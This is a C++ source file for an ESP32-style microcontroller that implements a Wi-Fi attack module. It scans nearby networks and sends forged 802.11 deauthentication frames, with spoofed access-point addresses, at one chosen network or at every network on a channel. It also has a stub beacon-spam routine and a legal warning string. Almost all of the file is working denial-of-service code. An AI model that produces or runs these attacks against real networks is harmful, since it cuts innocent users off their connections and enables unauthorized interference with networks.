#include "WiFiAttacks.h"

WiFiAttacks wifiAttacks;

WiFiAttacks::WiFiAttacks() {
    isScanning = false;
    isAttacking = false;
    currentStats = {};
    currentConfig = {};
}

WiFiAttacks::~WiFiAttacks() {
    stopDeauthAttack();
    stopNetworkScan();
}

bool WiFiAttacks::startNetworkScan() {
    if (isScanning) {
        Serial.println("⚠️ Network scan already in progress");
        return false;
    }
    
    Serial.println("📡 Starting WiFi network scan...");
    
    // Set WiFi to station mode for scanning
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    isScanning = true;
    discoveredNetworks.clear();
    
    // Start async scan
    int networks = WiFi.scanNetworks(true, true); // async=true, show_hidden=true
    
    if (networks == WIFI_SCAN_RUNNING) {
        Serial.println("🔍 Async scan started...");
        return true;
    } else if (networks > 0) {
        Serial.println("✅ Found " + String(networks) + " networks immediately");
        
        for (int i = 0; i < networks; i++) {
            WiFiTarget target;
            target.ssid = WiFi.SSID(i);
            target.bssid = WiFi.BSSIDstr(i);
            target.channel = WiFi.channel(i);
            target.rssi = WiFi.RSSI(i);
            target.authMode = WiFi.encryptionType(i);
            target.isHidden = (target.ssid.length() == 0);
            target.lastSeen = millis();
            
            discoveredNetworks.push_back(target);
        }
        
        isScanning = false;
        return true;
    } else {
        Serial.println("❌ No networks found");
        isScanning = false;
        return false;
    }
}

void WiFiAttacks::stopNetworkScan() {
    if (isScanning) {
        WiFi.scanDelete();
        isScanning = false;
        Serial.println("⏹️ Network scan stopped");
    }
}

std::vector<WiFiTarget> WiFiAttacks::getDiscoveredNetworks() {
    // Check if async scan completed
    if (isScanning) {
        int networks = WiFi.scanComplete();
        if (networks >= 0) {
            Serial.println("✅ Scan completed, found " + String(networks) + " networks");
            
            discoveredNetworks.clear();
            for (int i = 0; i < networks; i++) {
                WiFiTarget target;
                target.ssid = WiFi.SSID(i);
                target.bssid = WiFi.BSSIDstr(i);
                target.channel = WiFi.channel(i);
                target.rssi = WiFi.RSSI(i);
                target.authMode = WiFi.encryptionType(i);
                target.isHidden = (target.ssid.length() == 0);
                target.lastSeen = millis();
                
                discoveredNetworks.push_back(target);
            }
            
            isScanning = false;
            WiFi.scanDelete();
        }
    }
    
    return discoveredNetworks;
}

bool WiFiAttacks::startDeauthAttack(const String& targetSSID, int packetCount) {
    if (isAttacking) {
        Serial.println("⚠️ Attack already in progress");
        return false;
    }
    
    // Find target network
    WiFiTarget* target = findTarget(targetSSID);
    if (!target) {
        Serial.println("❌ Target network not found: " + targetSSID);
        return false;
    }
    
    Serial.println("💥 Starting deauth attack on: " + targetSSID);
    Serial.println("📡 Channel: " + String(target->channel));
    Serial.println("📊 BSSID: " + target->bssid);
    Serial.println("🎯 Packets: " + String(packetCount));
    
    // Configure attack
    currentConfig.targetSSID = targetSSID;
    currentConfig.targetBSSID = target->bssid;
    currentConfig.channel = target->channel;
    currentConfig.packetCount = packetCount;
    currentConfig.delayMs = 100;
    currentConfig.broadcastMode = false;
    currentConfig.randomizeSource = true;
    
    // Reset stats
    currentStats = {};
    currentStats.startTime = millis();
    currentStats.isActive = true;
    
    // Set WiFi to promiscuous mode
    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
    
    isAttacking = true;
    
    // Start attack in background task
    xTaskCreate([](void* param) {
        WiFiAttacks* attacks = (WiFiAttacks*)param;
        attacks->executeDeauthAttack();
        vTaskDelete(NULL);
    }, "DeauthTask", 4096, this, 1, NULL);
    
    return true;
}

void WiFiAttacks::executeDeauthAttack() {
    uint8_t targetMAC[6];
    uint8_t apMAC[6];
    
    macStringToBytes(currentConfig.targetBSSID, apMAC);
    
    for (int i = 0; i < currentConfig.packetCount && isAttacking; i++) {
        // Generate random client MAC if randomizing
        if (currentConfig.randomizeSource) {
            generateRandomMAC(targetMAC);
        }
        
        // Inject deauth packet
        if (injectDeauthPacket(targetMAC, apMAC, currentConfig.channel)) {
            currentStats.packetsTransmitted++;
        }
        
        delay(currentConfig.delayMs);
        
        // Update progress
        if (i % 10 == 0) {
            Serial.println("💥 Deauth progress: " + String(i) + "/" + String(currentConfig.packetCount));
        }
    }
    
    currentStats.attackDuration = millis() - currentStats.startTime;
    currentStats.isActive = false;
    isAttacking = false;
    
    Serial.println("✅ Deauth attack completed");
    Serial.println("📊 Packets sent: " + String(currentStats.packetsTransmitted));
    Serial.println("⏱️ Duration: " + String(currentStats.attackDuration) + "ms");
}

bool WiFiAttacks::startBroadcastDeauth(int channel, int packetCount) {
    if (isAttacking) {
        Serial.println("⚠️ Attack already in progress");
        return false;
    }
    
    if (channel == 0) {
        channel = getOptimalChannel();
    }
    
    Serial.println("💥 Starting broadcast deauth attack");
    Serial.println("📡 Channel: " + String(channel));
    Serial.println("🎯 Packets: " + String(packetCount));
    Serial.println("⚠️ WARNING: This will affect ALL networks on channel " + String(channel));
    
    currentConfig.targetSSID = "BROADCAST";
    currentConfig.targetBSSID = "FF:FF:FF:FF:FF:FF";
    currentConfig.channel = channel;
    currentConfig.packetCount = packetCount;
    currentConfig.delayMs = 50;
    currentConfig.broadcastMode = true;
    currentConfig.randomizeSource = true;
    
    currentStats = {};
    currentStats.startTime = millis();
    currentStats.isActive = true;
    
    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    isAttacking = true;
    
    // Start broadcast attack
    xTaskCreate([](void* param) {
        WiFiAttacks* attacks = (WiFiAttacks*)param;
        attacks->executeBroadcastDeauth();
        vTaskDelete(NULL);
    }, "BroadcastDeauthTask", 4096, this, 1, NULL);
    
    return true;
}

void WiFiAttacks::executeBroadcastDeauth() {
    uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t randomMAC[6];
    
    for (int i = 0; i < currentConfig.packetCount && isAttacking; i++) {
        // Target all discovered networks on this channel
        for (const auto& network : discoveredNetworks) {
            if (network.channel == currentConfig.channel) {
                uint8_t apMAC[6];
                macStringToBytes(network.bssid, apMAC);
                
                // Generate random client MAC
                generateRandomMAC(randomMAC);
                
                // Send deauth to random client
                if (injectDeauthPacket(randomMAC, apMAC, currentConfig.channel)) {
                    currentStats.packetsTransmitted++;
                }
                
                // Send deauth to broadcast (affects all clients)
                if (injectDeauthPacket(broadcastMAC, apMAC, currentConfig.channel)) {
                    currentStats.packetsTransmitted++;
                }
                
                currentStats.targetsHit++;
            }
        }
        
        delay(currentConfig.delayMs);
        
        if (i % 20 == 0) {
            Serial.println("💥 Broadcast deauth progress: " + String(i) + "/" + String(currentConfig.packetCount));
        }
    }
    
    currentStats.attackDuration = millis() - currentStats.startTime;
    currentStats.isActive = false;
    isAttacking = false;
    
    Serial.println("✅ Broadcast deauth attack completed");
}

bool WiFiAttacks::injectDeauthPacket(const uint8_t* target, const uint8_t* ap, int channel) {
    DeauthFrame deauth;
    
    // Frame control: Deauthentication frame
    deauth.frame_ctrl[0] = 0xC0;
    deauth.frame_ctrl[1] = 0x00;
    
    // Duration
    deauth.duration[0] = 0x00;
    deauth.duration[1] = 0x00;
    
    // Addresses
    memcpy(deauth.destination, target, 6);  // Client MAC
    memcpy(deauth.source, ap, 6);           // AP MAC
    memcpy(deauth.bssid, ap, 6);            // BSSID (same as AP)
    
    // Sequence control
    static uint16_t seq = 0;
    deauth.seq_ctrl[0] = (seq & 0xFF);
    deauth.seq_ctrl[1] = (seq >> 8) & 0x0F;
    seq++;
    
    // Reason code: Class 3 frame received from nonassociated station
    deauth.reason_code[0] = 0x07;
    deauth.reason_code[1] = 0x00;
    
    // Send packet
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(deauth), false);
    
    return (result == ESP_OK);
}

bool WiFiAttacks::startBeaconSpam(const std::vector<String>& ssidList, int count) {
    Serial.println("📡 Starting beacon spam attack");
    Serial.println("🎯 SSIDs: " + String(ssidList.size()));
    Serial.println("📊 Count per SSID: " + String(count));
    
    for (int i = 0; i < count; i++) {
        for (const String& ssid : ssidList) {
            injectBeaconPacket(ssid, getOptimalChannel());
            delay(10);
        }
        
        if (i % 10 == 0) {
            Serial.println("📡 Beacon spam progress: " + String(i) + "/" + String(count));
        }
    }
    
    Serial.println("✅ Beacon spam completed");
    return true;
}

bool WiFiAttacks::injectBeaconPacket(const String& ssid, int channel, const uint8_t* bssid) {
    // This is a simplified beacon injection
    // In practice, you'd need to construct a full beacon frame with all IEs
    
    uint8_t beaconMAC[6];
    if (bssid) {
        memcpy(beaconMAC, bssid, 6);
    } else {
        generateRandomMAC(beaconMAC);
    }
    
    // For now, just log the beacon injection
    Serial.println("📡 Injecting beacon: " + ssid + " on channel " + String(channel));
    
    return true;
}

void WiFiAttacks::macStringToBytes(const String& mac, uint8_t* bytes) {
    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5]);
}

String WiFiAttacks::macBytesToString(const uint8_t* bytes) {
    char mac[18];
    sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]);
    return String(mac);
}

void WiFiAttacks::generateRandomMAC(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(0, 256);
    }
    // Set locally administered bit
    mac[0] |= 0x02;
    // Clear multicast bit
    mac[0] &= 0xFE;
}

WiFiTarget* WiFiAttacks::findTarget(const String& ssid) {
    for (auto& target : discoveredNetworks) {
        if (target.ssid.equals(ssid)) {
            return &target;
        }
    }
    return nullptr;
}

void WiFiAttacks::stopDeauthAttack() {
    if (isAttacking) {
        isAttacking = false;
        currentStats.isActive = false;
        Serial.println("⏹️ Deauth attack stopped");
    }
}

AttackStats WiFiAttacks::getAttackStats() {
    if (currentStats.isActive) {
        currentStats.attackDuration = millis() - currentStats.startTime;
    }
    return currentStats;
}

String WiFiAttacks::getStatsJSON() {
    String json = "{";
    json += "\"packetsTransmitted\":" + String(currentStats.packetsTransmitted) + ",";
    json += "\"attackDuration\":" + String(currentStats.attackDuration) + ",";
    json += "\"targetsHit\":" + String(currentStats.targetsHit) + ",";
    json += "\"isActive\":" + String(currentStats.isActive ? "true" : "false") + ",";
    json += "\"startTime\":" + String(currentStats.startTime);
    json += "}";
    return json;
}

int WiFiAttacks::getOptimalChannel() {
    // Return channel with most networks (most targets)
    std::map<int, int> channelCounts;
    
    for (const auto& network : discoveredNetworks) {
        channelCounts[network.channel]++;
    }
    
    int bestChannel = 6; // Default
    int maxCount = 0;
    
    for (const auto& pair : channelCounts) {
        if (pair.second > maxCount) {
            maxCount = pair.second;
            bestChannel = pair.first;
        }
    }
    
    return bestChannel;
}

String WiFiAttacks::getLegalWarning() {
    return "⚖️ LEGAL WARNING: WiFi attacks may be illegal in your jurisdiction. "
           "Only use on networks you own or have explicit permission to test. "
           "Unauthorized access to computer networks is a crime in most countries.";
}

String WiFiAttacks::getStatus() {
    String status = "WiFi Attacks Status:\n";
    status += "Scanning: " + String(isScanning ? "Active" : "Idle") + "\n";
    status += "Attacking: " + String(isAttacking ? "Active" : "Idle") + "\n";
    status += "Networks found: " + String(discoveredNetworks.size()) + "\n";
    
    if (currentStats.isActive) {
        status += "Current attack: " + currentConfig.targetSSID + "\n";
        status += "Packets sent: " + String(currentStats.packetsTransmitted) + "\n";
        status += "Duration: " + String(millis() - currentStats.startTime) + "ms\n";
    }
    
    return status;
}
